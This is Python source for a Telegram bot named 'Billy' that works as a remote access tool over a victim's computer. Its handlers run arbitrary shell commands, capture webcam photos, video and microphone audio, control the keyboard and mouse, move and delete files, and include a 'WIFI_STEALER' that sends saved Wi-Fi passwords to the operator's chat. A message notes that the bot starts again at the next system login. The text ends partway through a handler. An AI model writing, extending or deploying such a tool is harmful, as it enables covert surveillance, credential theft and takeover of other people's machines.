from telebot.async_telebot import AsyncTeleBot
from telebot import types
import asyncio
from modules import About, Environment, Camera, Command, Browser, File, Permissions, Restart, Screen, WIFI, Microphone, \
    Mouse, Parser, Keyboard, Logs, Exit, Admin, Network, Photo
import config
import constants

bot = AsyncTeleBot(Parser.get_token())


global permission_changeable
permission_changeable = ()


@bot.message_handler(commands=[constants.START_command, constants.MENU_command])
async def menu(message, valid_user=0):
    permission = Permissions.permissions_names[constants.MENU]
    id = message.from_user.id

    if not valid_user and not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    main_modes = {constants.ADMIN_preview: constants.ADMIN,
                  constants.MOUSE_preview: constants.MOUSE,
                  constants.CAMERA_preview: constants.CAMERA,
                  constants.MICROPHONE_preview: constants.MICROPHONE,
                  constants.WIFI_preview: constants.WIFI,
                  constants.NETWORK_preview: constants.NETWORK,
                  constants.BROWSER_preview: constants.BROWSER,
                  constants.PHOTO_preview: constants.PHOTO,
                  constants.FILE_preview: constants.FILE,
                  constants.KEYBOARD_preview: constants.KEYBOARD,
                  constants.SCREEN_preview: constants.SCREEN,
                  constants.COMMAND_preview: constants.COMMAND,
                  constants.ABOUT_preview: constants.ABOUT}

    markup = getMarkupModes(main_modes, is_main=1)

    await send_message(message.chat.id, text="What would you do?", reply_markup=markup)


@bot.message_handler(commands=[constants.ADMIN_MANAGEPERMISSIONS_command])
async def managepermissions(message):
    global permission_changeable

    permission = Permissions.getPermission(constants.ADMIN_MANAGEPERMISSIONS)

    id = message.from_user.id

    permission_id = getarg(
        message.text, constants.ADMIN_MANAGEPERMISSIONS_command)

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    if not permission_id.isdigit():
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    permission_changeable = (permission_id, {"allowed": [], "forbidden": []})

    prefix = constants.MANAGEPERMISSION + ':allow:'
    markup = types.InlineKeyboardMarkup()
    for callback, permission_name in Permissions.permissions_names.items():
        markup.add(types.InlineKeyboardButton(
            callback, callback_data=prefix + permission_name))

    await send_message(message.chat.id, text='Please press permissions you want to ALLOW:', reply_markup=markup)

    prefix = constants.MANAGEPERMISSION + ':forbid:'
    markup = types.InlineKeyboardMarkup()
    for callback, permission_name in Permissions.permissions_names.items():
        markup.add(types.InlineKeyboardButton(
            callback, callback_data=prefix + permission_name))

    await send_message(message.chat.id, text='Please press permissions you want to FORBID:', reply_markup=markup)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(
        constants.RESETPERMISSIONS_preview, callback_data=constants.RESETPERMISSIONS))
    markup.add(types.InlineKeyboardButton(
        constants.CANCELPERMISSIONS_preview, callback_data=constants.CANCELPERMISSIONS))
    markup.add(types.InlineKeyboardButton(
        constants.SAVEPERMISSIONS_preview, callback_data=constants.SAVEPERMISSIONS))

    await send_message(message.chat.id, text='When you are done, save.', reply_markup=markup)


@bot.message_handler(commands=[constants.ADMIN_DELETE_command])
async def delete(message):
    permission = Permissions.getPermission(constants.ADMIN_DELETE)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    markup.add(types.InlineKeyboardButton(
        constants.RESTART_preview, callback_data=constants.RESTART))

    await send_message(message.chat.id, text=Admin.delete(), reply_markup=markup)


@bot.message_handler(commands=[constants.KEYBOARD_SHORTCUT_command])
async def keyboardshortcut(message):
    permission = Permissions.getPermission(constants.KEYBOARD_SHORTCUT)

    id = message.from_user.id

    argument = getarg(message.text, constants.KEYBOARD_SHORTCUT_command)

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    answer = Keyboard.press_key(argument)
    markup = getMarkupModes()

    await send_message(message.chat.id, text=answer, reply_markup=markup)


@bot.message_handler(commands=[constants.KEYBOARD_BLOCK_command])
async def keyboardblock(message):
    permission = Permissions.getPermission(constants.KEYBOARD_BLOCK)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    time_working = getarg(message.text, constants.KEYBOARD_BLOCK_command)
    markup = getMarkupModes()

    if not time_working.isdigit() or int(time_working) > config.max_time_to_keyboard:
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    await send_message(message.chat.id, text="Keyboard blocked")

    Keyboard.block_keyboard(time_working)

    await send_message(message.chat.id, text="Keyboard unblocked.", reply_markup=markup)


@bot.message_handler(commands=[constants.KEYBOARD_SPAM_command])
async def keyboardspam(message):
    permission = Permissions.getPermission(constants.KEYBOARD_SPAM)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    time_working = getarg(message.text, constants.KEYBOARD_SPAM_command)
    markup = getMarkupModes()

    if not time_working.isdigit() or int(time_working) > config.max_time_to_keyboard:
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    await send_message(message.chat.id, text="Keyboard spam started.")

    Keyboard.spam(time_working)

    await send_message(message.chat.id, text="Keyboard spam finished.", reply_markup=markup)


@bot.message_handler(commands=[constants.KEYBOARD_PRINT_command])
async def keyboardprint(message):
    permission = Permissions.getPermission(constants.KEYBOARD_PRINT)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    text = getarg(message.text, constants.KEYBOARD_PRINT_command)

    Keyboard.print_text(text)

    markup = getMarkupModes()

    await send_message(message.chat.id, text="Text printed.", reply_markup=markup)


@bot.message_handler(commands=[constants.CAMERA_SHOT_command])
async def shot(message):
    permission = Permissions.getPermission(constants.CAMERA_SHOT)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    device_index = getarg(message.text, constants.CAMERA_SHOT_command)

    markup = getMarkupModes()

    if not device_index.isdigit():
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    await send_message(message.chat.id, text=constants.PROCESSING)

    flag_error, photo_path = Camera.shot(int(device_index))

    if flag_error:
        await send_message(message.chat.id, text=photo_path, reply_markup=markup)
        return

    photo = open(photo_path, 'rb')
    await bot.send_photo(message.chat.id, photo, reply_markup=markup)

    Camera.delete_tmp_photo()


@bot.message_handler(commands=[constants.CAMERA_VIDEO_command])
async def video(message):
    permission = Permissions.getPermission(constants.CAMERA_VIDEO)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    arguments = getarg(message.text, constants.CAMERA_VIDEO_command).split()

    if len(arguments) != 2 or not (arguments[0].isdigit() and arguments[1].isdigit()):
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    device_index, time_working = arguments

    if not time_working.isdigit() or int(time_working) > config.max_time_to_keyboard:
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    await send_message(message.chat.id, text="Recording started")

    flag_error, video_path = Camera.video(int(device_index), int(time_working))

    await send_message(message.chat.id, text="Recording finished")

    if flag_error:
        await send_message(message.chat.id, text=video_path, reply_markup=markup)
        return

    video = open(video_path, 'rb')
    await bot.send_video(message.chat.id, video, reply_markup=markup)

    Camera.delete_tmp_video()


@bot.message_handler(commands=[constants.MOUSE_MOVE_command])
async def movemouse(message):
    permission = Permissions.getPermission(constants.MOUSE_MOVE)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    coordinates = getarg(message.text, constants.MOUSE_MOVE_command).split()

    if len(coordinates) != 2 or not (coordinates[0].isdigit() and coordinates[1].isdigit()):
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    Mouse.move(int(coordinates[0]), int(coordinates[1]))

    await send_message(message.chat.id, text="Mouse moved.", reply_markup=markup)


@bot.message_handler(commands=[constants.MOUSE_SCROLL_command])
async def scrollmouse(message):
    permission = Permissions.getPermission(constants.MOUSE_SCROLL)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    scroll_key = getarg(message.text, constants.MOUSE_SCROLL_command)

    if not (scroll_key.isdigit() or (len(scroll_key) >= 2 and scroll_key[0] == '-' and scroll_key[1:].isdigit())):
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    Mouse.scroll(int(scroll_key))

    await send_message(message.chat.id, text="Mouse scrolled.", reply_markup=markup)


@bot.message_handler(commands=[constants.MOUSE_BLOCK_command])
async def blockmouse(message):
    permission = Permissions.getPermission(constants.MOUSE_BLOCK)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    time_working = getarg(message.text, constants.MOUSE_BLOCK_command)
    markup = getMarkupModes()

    if not time_working.isdigit() or int(time_working) > config.max_time_to_mouse:
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    await send_message(message.chat.id, text="Mouse blocked.")

    Mouse.block_mouse(time_working)

    await send_message(message.chat.id, text="Mouse unblocked.", reply_markup=markup)


@bot.message_handler(commands=[constants.MOUSE_SPAM_command])
async def spammouse(message):
    permission = Permissions.getPermission(constants.MOUSE_SPAM)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    time_working = getarg(message.text, constants.MOUSE_SPAM_command)
    markup = getMarkupModes()

    if not time_working.isdigit() or int(time_working) > config.max_time_to_mouse:
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    await send_message(message.chat.id, text="Spam mouse started.")

    Mouse.spam_mouse(time_working)

    await send_message(message.chat.id, text="Spam mouse finished.", reply_markup=markup)


@bot.message_handler(commands=[constants.MICROPHONE_RECORD_command])
async def recordmicrophone(message):
    permission = Permissions.getPermission(constants.MICROPHONE_RECORD)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    params = getarg(message.text, constants.MICROPHONE_RECORD_command).split()
    markup = getMarkupModes()

    if not len(params) == 2 or not (params[0].isdigit() and params[1].isdigit()):
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    params = list(map(int, params))

    await send_message(message.chat.id, text="Recording started.")

    error_flag, audio_path = Microphone.record(*params)

    if error_flag:
        await send_message(message.chat.id, text=audio_path, reply_markup=markup)
        return

    await send_message(message.chat.id, text="Recording finished.", reply_markup=markup)

    await bot.send_audio(message.chat.id, open(audio_path, 'rb'))

    Microphone.delete_tmp_file()


@bot.message_handler(commands=[constants.BROWSER_OPENURL_command])
async def openurl(message):
    permission = Permissions.getPermission(constants.BROWSER_OPENURL)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    url = getarg(message.text, constants.BROWSER_OPENURL_command)

    error_flag, answer = Browser.open_url(url)

    if error_flag:
        await send_message(message.chat.id, text="Error: " + answer, reply_markup=markup)

    await send_message(message.chat.id, text="Url opened.", reply_markup=markup)


@bot.message_handler(commands=[constants.FILE_GETINF_command])
async def getinffile(message):
    permission = Permissions.getPermission(constants.FILE_GETINF)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    path = getarg(message.text, constants.FILE_GETINF_command)

    await send_message(message.chat.id, text=File.getinf(path), reply_markup=markup)


@bot.message_handler(commands=[constants.FILE_REMOVE_command])
async def remove(message):
    permission = Permissions.getPermission(constants.FILE_REMOVE)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    path = getarg(message.text, constants.FILE_REMOVE_command)

    await send_message(message.chat.id, text=File.remove(path), reply_markup=markup)


@bot.message_handler(commands=[constants.FILE_CREATEFILE_command])
async def createfile(message):
    permission = Permissions.getPermission(constants.FILE_CREATEFILE)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    args = list(map(str.strip, getarg(
        message.text, constants.FILE_CREATEFILE_command).split(config.special_separator)))
    value = ''

    if len(args) == 1:
        path = args

    elif len(args) == 2:
        path, value = args
    else:
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    await send_message(message.chat.id, text=File.create_file(path, value), reply_markup=markup)


@bot.message_handler(commands=[constants.FILE_CREATEDIR_command])
async def createdir(message):
    permission = Permissions.getPermission(constants.FILE_CREATEDIR)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    path = getarg(message.text, constants.FILE_CREATEDIR_command)

    await send_message(message.chat.id, text=File.create_dir(path), reply_markup=markup)


@bot.message_handler(commands=[constants.FILE_COPY_command])
async def copyfile(message):
    permission = Permissions.getPermission(constants.FILE_COPY)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    paths = list(map(str.strip, getarg(
        message.text, constants.FILE_COPY_command).split(config.special_separator)))

    if not len(paths) == 2:
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    await send_message(message.chat.id, text=File.copy_file(paths[0], paths[1]), reply_markup=markup)


@bot.message_handler(commands=[constants.FILE_UPLOAD_command])
async def upload(message):
    permission = Permissions.getPermission(constants.FILE_UPLOAD)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    paths = list(map(str.strip, getarg(
        message.text, constants.FILE_UPLOAD_command).split(config.special_separator)))

    if not len(paths) == 2:
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    await send_message(message.chat.id, text=File.upload(paths[0], paths[1]), reply_markup=markup)


@bot.message_handler(commands=[constants.FILE_DOWNLOAD_command])
async def download(message):
    permission = Permissions.getPermission(constants.FILE_DOWNLOAD)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    paths = list(map(str.strip, getarg(
        message.text, constants.FILE_DOWNLOAD_command).split(config.special_separator)))

    if not len(paths) == 2:
        await send_message(message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
        return

    await send_message(message.chat.id, text=File.download(paths[0], paths[1]), reply_markup=markup)


@bot.message_handler(commands=[constants.PHOTO_OPENPHOTO_command])
async def openphoto(message):
    permission = Permissions.getPermission(constants.PHOTO_OPENPHOTO)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    link = getarg(message.text, constants.PHOTO_OPENPHOTO_command)

    await send_message(message.chat.id, text=Photo.open_image(link), reply_markup=markup)


@bot.message_handler(commands=[constants.PHOTO_CHANGEWALLPAPERS_command])
async def changewallpapers(message):
    permission = Permissions.getPermission(constants.PHOTO_CHANGEWALLPAPERS)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    link = getarg(message.text, constants.PHOTO_CHANGEWALLPAPERS_command)

    await send_message(message.chat.id, text=Photo.change_wallpaper(link), reply_markup=markup)


@bot.message_handler(commands=[constants.COMMAND_RUNCOMMAND_command])
async def runcommand(message):
    permission = Permissions.getPermission(constants.COMMAND_RUNCOMMAND)

    id = message.from_user.id

    if not Permissions.check_permission(message, permission):
        await send_message(message.chat.id, text=Permissions.you_have_not_permissions)
        return

    markup = getMarkupModes()

    command = getarg(message.text, constants.COMMAND_RUNCOMMAND_command)

    await send_message(message.chat.id, text=Command.run_command(command), reply_markup=markup)


@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):
    req = call.data.split('_')

    global permission_changeable

    user_data = call

    if req[0] == constants.NETWORK:                          # NETWORK
        await send_default_message(user_data, permission=constants.NETWORK, text=constants.NETWORK_preview, markup_arg=Network.modes)

    elif req[0] == constants.NETWORK_GETIPMAC:
        permission = Permissions.getPermission(constants.NETWORK_GETIPMAC)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()
        await send_message(call.message.chat.id, text=Network.getIpMac(), reply_markup=markup)

    elif req[0] == constants.ADMIN:                            # ADMIN
        permission = Permissions.getPermission(constants.ADMIN)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes(Admin.modes)

        if Environment.check_old_billy():
            markup.add(types.InlineKeyboardButton(
                constants.ADMIN_DELETEOLDBILLY_preview, callback_data=constants.ADMIN_DELETEOLDBILLY))

        await send_message(call.message.chat.id, text=constants.ADMIN_preview, reply_markup=markup)

    elif req[0] == constants.ADMIN_MANAGEPERMISSIONS:
        permission = Permissions.getPermission(
            constants.ADMIN_MANAGEPERMISSIONS)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        message = f"This mode allows you to manage permissions. \nSyntax: /{constants.ADMIN_MANAGEPERMISSIONS_command} [id]\n"

        permissions = Permissions.get()
        for id, id_permissions in permissions.items():
            message += "ID: " + id + '\n'

            message += '- allowed:\n'
            if len(id_permissions['allowed']) == 0:
                message += "--- NO\n"
            else:
                for allowed_mode in id_permissions['allowed']:
                    message += "--- " + allowed_mode + '\n'

            message += '- forbidden:\n'
            if len(id_permissions['forbidden']) == 0:
                message += "--- NO\n"
            else:
                for forbidden_mode in id_permissions['forbidden']:
                    message += "--- " + forbidden_mode + '\n'

            message += '\n\n'

        markup = getMarkupModes()

        await send_message(call.message.chat.id, text=message, reply_markup=markup)

    elif req[0].split(':')[0] == constants.MANAGEPERMISSION:
        permission = Permissions.getPermission(
            constants.ADMIN_MANAGEPERMISSIONS)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        action = req[0].split(':')[1]
        mode = req[0].split(':')[2]

        if len(permission_changeable) != 2:
            await send_message(call.message.chat.id, text="Error. Invalid changeable id.")
            return

        if action == "allow":
            permission_changeable[1]["allowed"].append(mode)

        if action == "forbid":
            permission_changeable[1]["forbidden"].append(mode)

    elif req[0] == constants.SAVEPERMISSIONS:
        permission = Permissions.getPermission(
            constants.ADMIN_MANAGEPERMISSIONS)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        Permissions.add(permission_changeable)

        markup = getMarkupModes()

        await send_message(call.message.chat.id, text="Saved", reply_markup=markup)

    elif req[0] == constants.RESETPERMISSIONS:
        permission = Permissions.getPermission(
            constants.ADMIN_MANAGEPERMISSIONS)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        permission_changeable = (permission_changeable[0], {
                                 "allowed": [], "forbidden": []})

        markup = getMarkupModes()

        await send_message(call.message.chat.id, text="Reseted", reply_markup=markup)

    elif req[0] == constants.CANCELPERMISSIONS:
        permission = Permissions.getPermission(
            constants.ADMIN_MANAGEPERMISSIONS)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        permission_changeable = ()

        markup = getMarkupModes()

        await send_message(call.message.chat.id, text="Canceled", reply_markup=markup)

    elif req[0] == constants.ADMIN_DELETE:
        message = f'This option delete Billy. If you sure, that you want to delete him, /{constants.ADMIN_DELETE_command}.'

        await send_default_message(user_data, permission=constants.ADMIN_DELETE, text=message)

    elif req[0] == constants.ADMIN_DELETEOLDBILLY:
        permission = Permissions.getPermission(constants.ADMIN_DELETEOLDBILLY)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        await send_message(call.message.chat.id, text=constants.PROCESSING)

        await send_message(call.message.chat.id, text=Environment.delete_old_billy(), reply_markup=markup)

    elif req[0] == constants.ADMIN_UPDATE:
        permission = Permissions.getPermission(constants.ADMIN_UPDATE)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()
        markup.add(types.InlineKeyboardButton(
            constants.RESTART_preview, callback_data=constants.RESTART))

        await send_message(call.message.chat.id, text=constants.PROCESSING)

        await send_message(call.message.chat.id, text=Admin.update(), reply_markup=markup)

    elif req[0] == constants.ADMIN_GETLOGS:
        permission = Permissions.getPermission(constants.ADMIN_GETLOGS)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        await send_message(call.message.chat.id, text=constants.PROCESSING)

        logs = Logs.viewLog()

        await send_message(call.message.chat.id, logs, reply_markup=markup, parse_mode='HTML', disable_web_page_preview=True)

        Logs.uploadlog()

    elif req[0] == constants.ADMIN_CLEARLOGS:
        permission = Permissions.getPermission(constants.ADMIN_CLEARLOGS)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        await send_message(call.message.chat.id, text=constants.PROCESSING)

        Logs.downloadLog()

        Logs.clearLogs()

        Logs.uploadlog()

        await send_message(call.message.chat.id, text="Cleared.", reply_markup=markup)

        Logs.delete_tmp_file()

    elif req[0] == constants.ADMIN_STOPBILLY:
        permission = Permissions.getPermission(constants.ADMIN_STOPBILLY)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        await send_message(call.message.chat.id, text="Stopped. Billy will be start in the next system login.")

        Exit.stopBilly()

    elif req[0] == constants.KEYBOARD:                        # KEYBOARD
        await send_default_message(user_data, permission=constants.KEYBOARD, text=constants.KEYBOARD_preview,
                                   markup_arg=Keyboard.modes)

    elif req[0] == constants.KEYBOARD_SPAM:
        message = f"This mode allows you to randomly press keys for a certain amount of time. \nSyntax: /{constants.KEYBOARD_SPAM_command} [time] (seconds, no more than {config.max_time_to_keyboard} seconds)."

        await send_default_message(user_data, permission=constants.KEYBOARD_SPAM, text=message)

    elif req[0] == constants.KEYBOARD_SHORTCUT:
        message = f"This mode allows you to press a key or keyboard shortcut. \nSyntax: /{constants.KEYBOARD_SHORTCUT_command} key1+key2+key3."

        await send_default_message(user_data, permission=constants.KEYBOARD_SHORTCUT, text=message)

    elif req[0] == constants.KEYBOARD_BLOCK:
        message = f"This mode allows you to block keyboard. \nSyntax: /{constants.KEYBOARD_BLOCK_command} [time] (seconds, no more than {config.max_time_to_keyboard} seconds)."

        await send_default_message(user_data, permission=constants.KEYBOARD_BLOCK, text=message)

    elif req[0] == constants.KEYBOARD_PRINT:
        message = f"This mode allows you to type text on the keyboard. \nSyntax: /{constants.KEYBOARD_PRINT_command} [text]."

        await send_default_message(user_data, permission=constants.KEYBOARD_PRINT, text=message)

    elif req[0] == constants.CAMERA:                          # CAMERA
        await send_default_message(user_data, permission=constants.CAMERA, text=constants.CAMERA_preview, markup_arg=Camera.modes)

    elif req[0] == constants.CAMERA_SHOT:
        message = f"This mode allows you to shot.\n{Camera.beautiful_get_available_cameras()} \nSyntax: /{constants.CAMERA_SHOT_command} [device]."

        await send_default_message(user_data, permission=constants.CAMERA_SHOT, text=message)

    elif req[0] == constants.CAMERA_VIDEO:
        message = f"This mode allows you to record a video.\n{Camera.beautiful_get_available_cameras()} \nSyntax: /{constants.CAMERA_VIDEO_command} [device] [time] (seconds, no more than {config.max_time_to_camera} seconds)."

        await send_default_message(user_data, permission=constants.CAMERA_VIDEO, text=message)

    elif req[0] == constants.WIFI:                           # WIFI
        await send_default_message(user_data, permission=constants.WIFI, text=constants.WIFI_preview, markup_arg=WIFI.modes)

    elif req[0] == constants.WIFI_STEALER:
        permission = Permissions.getPermission(constants.WIFI_STEALER)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        is_successfull, stealed_wifi = WIFI.steal_wifi()

        if not is_successfull:
            await send_message(call.message.chat.id, text=stealed_wifi, reply_markup=markup)
            return

        answer = 'NAME                              PASSWORD\n'
        for wifi, password in stealed_wifi.items():
            answer += wifi + ' ' * \
                (30 - ((len(wifi) - 4) * (len(wifi) > 4))) + password + '\n'

        await send_message(call.message.chat.id, text=answer, reply_markup=markup)

    elif req[0] == constants.WIFI_SHOWWIFI:
        permission = Permissions.getPermission(constants.WIFI_SHOWWIFI)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        WIFI_list = WIFI.get_list_of_wifi()

        await send_message(call.message.chat.id, text=WIFI_list, reply_markup=markup)

    elif req[0] == constants.MOUSE:                           # MOUSE
        await send_default_message(user_data, permission=constants.MOUSE, text=constants.MOUSE_preview, markup_arg=Mouse.modes)

    elif req[0] == constants.MOUSE_MOVE:
        message = f"This mode allows you to move a mouse. \nSyntax: /{constants.MOUSE_MOVE_command} [x] [y]."

        await send_default_message(user_data, permission=constants.MOUSE_MOVE, text=message)

    elif req[0] == constants.MOUSE_SCROLL:
        message = f"This mode allows you to move a mouse. \nSyntax: /{constants.MOUSE_SCROLL_command} [value]."

        await send_default_message(user_data, permission=constants.MOUSE_SCROLL, text=message)

    elif req[0] == constants.MOUSE_LEFTCLICK:
        permission = Permissions.getPermission(constants.MOUSE_LEFTCLICK)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        Mouse.left_click()

        await send_message(call.message.chat.id, text="Clicked.", reply_markup=markup)

    elif req[0] == constants.MOUSE_RIGHTCLICK:
        permission = Permissions.getPermission(constants.MOUSE_RIGHTCLICK)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        Mouse.right_click()

        await send_message(call.message.chat.id, text="Clicked.", reply_markup=markup)

    elif req[0] == constants.MOUSE_DOUBLECLICK:
        permission = Permissions.getPermission(constants.MOUSE_DOUBLECLICK)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        Mouse.double_click()

        await send_message(call.message.chat.id, text="Clicked.", reply_markup=markup)

    elif req[0] == constants.MOUSE_PRESS:
        permission = Permissions.getPermission(constants.MOUSE_PRESS)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        Mouse.press()

        await send_message(call.message.chat.id, text="Pressed.", reply_markup=markup)

    elif req[0] == constants.MOUSE_UNPRESS:
        permission = Permissions.getPermission(constants.MOUSE_UNPRESS)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        Mouse.unpress()

        await send_message(call.message.chat.id, text="Unpressed.", reply_markup=markup)

    elif req[0] == constants.MOUSE_GETPOSITION:
        permission = Permissions.getPermission(constants.MOUSE_GETPOSITION)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        x, y = Mouse.get_position()

        await send_message(call.message.chat.id, text=f"{x} {y}", reply_markup=markup)

    elif req[0] == constants.MOUSE_BLOCK:
        message = f"This mode allows you to block mouse. \nSyntax: /{constants.MOUSE_BLOCK_command} [time] (seconds, no more than {config.max_time_to_mouse} seconds)."

        await send_default_message(user_data, permission=constants.MOUSE_BLOCK, text=message)

    elif req[0] == constants.MOUSE_SPAM:
        message = f"This mode allows you to spam mouse. \nSyntax: /{constants.MOUSE_SPAM_command} [time] (seconds, no more than {config.max_time_to_mouse} seconds)."

        await send_default_message(user_data, permission=constants.MOUSE_SPAM, text=message)

    elif req[0] == constants.MICROPHONE:                       # MICROPHONE
        await send_default_message(user_data, permission=constants.MICROPHONE, text=constants.MICROPHONE_preview, markup_arg=Microphone.modes)

    elif req[0] == constants.MICROPHONE_GETDEVICES:
        permission = Permissions.getPermission(constants.MICROPHONE_GETDEVICES)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        devices = Microphone.get_devices()

        message = 'Devices:\n'
        for i in range(len(devices)):
            message += f"{i + 1}) {devices[i]['name']}\n"

        await send_message(call.message.chat.id, text=message, reply_markup=markup)

    elif req[0] == constants.MICROPHONE_RECORD:
        permission = Permissions.getPermission(constants.MICROPHONE_RECORD)

        if not Permissions.check_permission(user_data, permission):
            await send_message(call.message.chat.id, text=Permissions.you_have_not_permissions)
            return

        markup = getMarkupModes()

        devices = Microphone.get_devices()

